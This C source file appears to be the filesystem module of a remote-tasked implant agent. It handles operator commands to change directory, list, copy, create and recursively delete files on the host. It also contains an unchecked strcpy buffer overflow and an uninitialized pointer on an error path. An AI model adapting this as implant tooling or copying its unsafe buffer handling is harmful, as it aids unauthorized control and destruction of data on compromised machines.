#include "Tasks/FileSystem.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_CD
VOID FileSystemCd(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);
    if (nbArg == 0)
    {
        return;
    }

    SIZE_T  size        = 0;
    PCHAR   inputPath   = ParserStringCopy(arguments, &size);

    _dbg("Using path %s ", inputPath);

    if (!SetCurrentDirectoryA(inputPath))
    {       
        DWORD error = GetLastError();
        _err("Could not change directory to %s : ERROR CODE %d", inputPath, error);
        PackageError(taskUuid, error);
        goto end;
    }
    
    // success
    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    LocalFree(inputPath);
}
#endif

#ifdef INCLUDE_CMD_PWD
VOID FileSystemPwd(PCHAR taskUuid, PPARSER arguments)
{
    char dir[2048];
    int length = GetCurrentDirectoryA(sizeof(dir), dir);
    if (length == 0)
    {
        DWORD error = GetLastError();
        PackageError(taskUuid, error);
        goto end;
    }
        
    // Response package
    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, dir, FALSE);

    // success
    PackageComplete(taskUuid, data);

end:
    PackageDestroy(data);
}
#endif

#ifdef INCLUDE_CMD_MKDIR
VOID FileSystemMkdir(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    SIZE_T size = 0;
    PCHAR dirname = ParserStringCopy(arguments, &size);

    _dbg("Creating directory: \"%s\"", dirname);

    // Create the directory
    if (!CreateDirectoryA(dirname, NULL))
    {
        char *lasterror = GetLastErrorAsStringA();
        _err("Could not create directory %s : %s", dirname, lasterror);
        
        DWORD error = GetLastError();
        PackageError(taskUuid, error);

        goto end;
    }

    // success
    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    LocalFree(dirname);
}
#endif

#ifdef INCLUDE_CMD_CP
VOID FileSystemCopy(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        goto end;
    }

    SIZE_T size     = 0;
    SIZE_T size2    = 0;
    PCHAR existingFileName = ParserStringCopy(arguments, &size);
    PCHAR newFileName = ParserStringCopy(arguments, &size2);

    _dbg("Copying file \"%s\" to \"%s\"", existingFileName, newFileName);

    // Copy the file
    if (!CopyFileA(existingFileName, newFileName, FALSE))
    {
        char *lastError = GetLastErrorAsStringA();
        _err("Copy failed: %s", lastError);

        DWORD error = GetLastError();
        PackageError(taskUuid, error);

        goto end;
    }

    // success
    PackageComplete(taskUuid, NULL);

end:;
    // Cleanup
    LocalFree(newFileName);
    LocalFree(existingFileName);
}
#endif

#ifdef INCLUDE_CMD_LS
VOID FileSystemList(PCHAR taskUuid, PPARSER arguments)
{
#define MAX_FILENAME 0x4000
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
        return;

    UINT32 PathSize = NULL;
    SIZE_T size     = 0;
    char filename[MAX_FILENAME];
    PCHAR file = ParserStringCopy(arguments, &size);        // allocates

    strcpy(filename, file);

    _dbg("Filename: %s", filename);

    // Store in temp buffer so that we can copy the full size into serialized format
    PPackage temp = PackageInit(0, FALSE);

#define SOURCE_DIRECTORY "\\*"
    if (!strncmp(filename, "." SOURCE_DIRECTORY, MAX_FILENAME)) // ".\*"
    {
        GetCurrentDirectoryA(MAX_FILENAME, filename);
        strncat_s(filename, MAX_FILENAME, SOURCE_DIRECTORY, strlen(SOURCE_DIRECTORY));
    }
    else
    {
        // Make sure path ends with \*  e.g., C:\Windows\*
        PathSize = strlen(filename);
        if (filename[PathSize - 1] != 0x5c) // '\'
            filename[PathSize++] = 0x5c;
        filename[PathSize++] = 0x2a; // *
        filename[PathSize] = 0x00;
    }

    _dbg("[ls] %s", filename);

    PackageAddFormatPrintf(temp, FALSE, "%s\n", filename);
    WIN32_FIND_DATAA findData;
    HANDLE firstFile = FindFirstFileA(filename, &findData);

    if (firstFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Could not open %s : ERROR CODE %d", filename, error);
        PackageError(taskUuid, error);
        goto end;
    }

    SYSTEMTIME systemTime, localTime;
    do
    {
        FileTimeToSystemTime(&findData.ftLastWriteTime, &systemTime);
        SystemTimeToTzSpecificLocalTime(NULL, &systemTime, &localTime);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            PackageAddFormatPrintf(temp, FALSE, "D\t0\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
                            localTime.wMonth, localTime.wDay, localTime.wYear,
                            localTime.wHour, localTime.wMinute, localTime.wSecond,
                            findData.cFileName);
        }
        else
        {
            PackageAddFormatPrintf(temp, FALSE, "F\t%I64d\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
                            ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow,
                            localTime.wMonth, localTime.wDay, localTime.wYear,
                            localTime.wHour, localTime.wMinute, localTime.wSecond,
                            findData.cFileName);
        }
    } while (FindNextFileA(firstFile, &findData));

    FindClose(firstFile);


    // success
    PackageComplete(taskUuid, temp);

end:
    // Cleanup
    LocalFree(file);
    PackageDestroy(temp);
}
#endif

#ifdef INCLUDE_CMD_RM
BOOL FilesystemIsDirectory(char *filename)
{
    return GetFileAttributesA(filename) & FILE_ATTRIBUTE_DIRECTORY;
}

VOID FilesystemRemoveRecursiveCallback(const char *a1, const char *a2, BOOL isDirectory)
{
    char *lpPathName = (char *)malloc(0x4000);
    _snprintf(lpPathName, 0x4000, "%s\\%s", a1, a2);
    if (isDirectory)
        RemoveDirectoryA(lpPathName);
    else
        DeleteFileA(lpPathName);
    free(lpPathName);
}

VOID FilesystemFindAndProcess(char *filename, WIN32_FIND_DATAA *findData)
{
#define MAX_FILENAME 0x8000
    char *lpFileName;

    lpFileName = malloc(MAX_FILENAME);
    snprintf(lpFileName, MAX_FILENAME, "%s\\*", filename);
    LPWIN32_FIND_DATAA lpCurrentFindFileData = findData;
    HANDLE hFindFile = FindFirstFileA(lpFileName, lpCurrentFindFileData);
    free(lpFileName);

    if (hFindFile == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (lpCurrentFindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (strcmp(lpCurrentFindFileData->cFileName, ".") && strcmp(lpCurrentFindFileData->cFileName, ".."))
            {
                char *lpFileNameInternal = malloc(MAX_FILENAME);
                snprintf(lpFileNameInternal, MAX_FILENAME, "%s", lpCurrentFindFileData->cFileName);

                lpFileName = malloc(MAX_FILENAME);
                snprintf(lpFileName, MAX_FILENAME, "%s\\%s", filename, findData->cFileName);
                FilesystemFindAndProcess(lpFileName, findData);
                free(lpFileName);

                FilesystemRemoveRecursiveCallback(filename, lpFileNameInternal, TRUE);
                free(lpFileNameInternal);
            }

            lpCurrentFindFileData = findData;
        }
        else
        {
            FilesystemRemoveRecursiveCallback(filename, lpCurrentFindFileData->cFileName, FALSE);
        }
    } while (FindNextFileA(hFindFile, lpCurrentFindFileData));
    FindClose(hFindFile);
}

VOID FilesystemRemoveDirectoryChildren(char *filepath)
{
    WIN32_FIND_DATAA findData;

    FilesystemFindAndProcess(
        filepath,
        &findData);
}

VOID FileSystemRemove(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
        return;

    SIZE_T size = 0;
    PCHAR filepath = ParserStringCopy(arguments, &size);

    if (FilesystemIsDirectory(filepath))
    {
        FilesystemRemoveDirectoryChildren(filepath);
        RemoveDirectoryA(filepath);
    }
    else
    {
        DeleteFileA(filepath);
    }

    // success
    PackageComplete(taskUuid, NULL);

end:;
    // Cleanup
    LocalFree(filepath);
}
#endif
